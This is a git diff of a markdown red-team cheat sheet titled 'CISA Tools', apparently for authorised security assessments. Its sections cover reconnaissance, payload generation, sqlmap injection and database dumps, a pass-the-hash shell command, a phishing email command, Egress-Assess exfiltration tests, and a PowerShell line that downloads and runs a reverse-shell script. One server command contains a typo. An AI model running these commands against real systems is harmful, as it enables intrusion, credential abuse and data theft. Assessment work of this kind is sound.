@@ -1,8 +1,7 @@
 ---
 title: CISA Tools
 ---
-# List of Tools for CISA
-## Network Reconnaissance
+# Network Reconnaissance
 
 ### NMAP
 ###### Ping Sweep
@@ -41,7 +40,8 @@ Create a new Advanced Scan
 
 ### SimplyEmail
 ### theHarvester
-## Web Application Reconnaissance
+
+# Web Application Reconnaissance
 ### Vega
 Open Vega by selecting the icon from the sidebar or menu in Kali.
 ### Acunetix
@@ -53,7 +53,7 @@ nikto -h "ip address"
 ```
 ### Nmap Scripting Engine
 
-## Payload Generation
+# Payload Generation
 ### Cobalt Strike
 ### MSFvenom
 ### Veil Framework
@@ -76,12 +76,12 @@ Now you can Generate the payload.
 
 
 
-## Listeners
+# Listeners
 ### Cobalt Strike
 ### Metasploit
 ### netcat
 
-## Email Client
+# Email Client
 ### Cobalt Strike
 ### SendEmail
 
@@ -91,44 +91,18 @@ sendEmail -o tls=no -t target@corp.com -f hacker@foo.bar -s
 ```
 
 
-## Enumeration
+# Enumeration
 ### PowerSploit
 
-## Directory Brute Force
+# Directory Brute Force
 ### Aquatone
 ### EyeWitness
 
-## Directory Bruce-Force
+# Directory Bruce-Force
 ### DirBuster
 ### Gobuster
 
-## Exploitation/Privilege Escalation
-### PowerSploit
-### Burp Suite
-### Metasploit
-### SearchSploit
-### sqlmap
-create file from burp with loginin POST from burp suite - This is easier when done under the target usage --batch assume defaults good for background enumeration. 
-```
-sqlmap -r login.req -p id --level 5 --risk 3 --threads 10 --batch 
-```
-Basic sqlmap command usage
-```
-sqlmap -u "http://10.20.160.35/?action-data_management&cpmvc_do_action=mvparse&f=edit&id=1" --dbs
-sqlmap -u "http://10.20.160.35/?action-data_management&cpmvc_do_action=mvparse&f=edit&id=1" -D "databasename" --tables 
-sqlmap -u "http://10.20.160.35/?action-data_management&cpmvc_do_action=mvparse&f=edit&id=1" -D "databasename" -T "tables" --columns 
-sqlmap -u "http://10.20.160.35/?action-data_management&cpmvc_do_action=mvparse&f=edit&id=1" -D "databasename" -T "tables" -C "columnName" --dump
-```
-Manual testing for sqlmap can include using the following. 
-```
-http://site/name.php?henryearl=1
-http://site/name.php?henryearl=1'
-http://site/name.php?henryearl=-1
-http://site/name.php?henryearl=-1'
-```
-[Thanks to Database Tutorials](https://www.youtube.com/watch?v=oWHKIiRGjtQ)
-
-## Password Attacks
+# Password Attacks
 ### hashcat
 ### Hydra
 ### Kerberoast
@@ -155,15 +129,42 @@ Pass the Hash of a user and open a cmd shell.
 ```
 pth-winexe -u administrator%"hash"//"target ip" cmd.exe
 ```
+# Exploitation/Privilege Escalation
+### PowerSploit
+The "PowerUp.ps1" script (located in "~/Tools/Powersploit/Privesc") can be used to automate the process of identifying Windows misconfigurations which are potential privilege escalation vectors. Additional research can be done to understand how to leverage the discovered misconfigurations, as methods may vary.
+[ReadTeam_CheatSheet](https://gist.github.com/jivoi/c354eaaf3019352ce32522f916c03d70)
 
-## Data Exfiltration
+### Burp Suite
+### Metasploit
+### SearchSploit
+### sqlmap
+create file from burp with loginin POST from burp suite - This is easier when done under the target usage --batch assume defaults good for background enumeration. 
+```
+sqlmap -r login.req -p id --level 5 --risk 3 --threads 10 --batch 
+```
+Basic sqlmap command usage
+```
+sqlmap -u "http://10.20.160.35/?action-data_management&cpmvc_do_action=mvparse&f=edit&id=1" --dbs
+sqlmap -u "http://10.20.160.35/?action-data_management&cpmvc_do_action=mvparse&f=edit&id=1" -D "databasename" --tables 
+sqlmap -u "http://10.20.160.35/?action-data_management&cpmvc_do_action=mvparse&f=edit&id=1" -D "databasename" -T "tables" --columns 
+sqlmap -u "http://10.20.160.35/?action-data_management&cpmvc_do_action=mvparse&f=edit&id=1" -D "databasename" -T "tables" -C "columnName" --dump
+```
+Manual testing for sqlmap can include using the following. 
+```
+http://site/name.php?henryearl=1
+http://site/name.php?henryearl=1'
+http://site/name.php?henryearl=-1
+http://site/name.php?henryearl=-1'
+```
+[Thanks to Database Tutorials](https://www.youtube.com/watch?v=oWHKIiRGjtQ)
+
+# Data Exfiltration
 ### Egress-Assess
 In order to fulfill the data exfiltration service of an assessment, a tool called Egress-Assess is used. On the designated Egress-Assess server (the external Egress-Assess Kali machine) navigate to ~/Tools/Egress-Assess and run: 
 ```
-Egress-Assess.py --server <protocol>
+Egress-Assess.py --server "protocol"
 ```
-For ftp and smtp protocols, specify a --username and --password that the client can use to connect and be sure to indicate those on the client as well.
-
+For ftp and smtp protocols, specify a --username and --password that the client can use to connect and be sure to indicate those on the client as well. 
 
 
 Once your server is set up, use the Egress-Assess client (the internal Egress-Assess Kali machine) and navigate to the ~/Tools/Egress-Assess directory. Run the following command: 
@@ -171,3 +172,15 @@ Once your server is set up, use the Egress-Assess client (the internal Egress-As
 /Egress-Assess.py --client <protocol> --ip <server ip address> --datatype ssn –data-size 15’.
 ```
 Repeat this process for each of the protocols (http, https, ftp, icmp, smb, dns, smtp) and use the server output to determine if the data exfiltration was blocked or not. Use a smaller data size for DNS and ICMP protocols since they utilize a lot of packets. Include the results in your report.
+
+# Windows Powershell
+```
+IEX(New-Object System.Net.WebClient).downloadString('http://"local ip"/Invoke-PowerShellTcp.ps1').  
+```
+# Kali Web Server
+```
+python3 -m htt.server 8080
+```
+```
+python -m SimpleHTTPServer 8080
+```
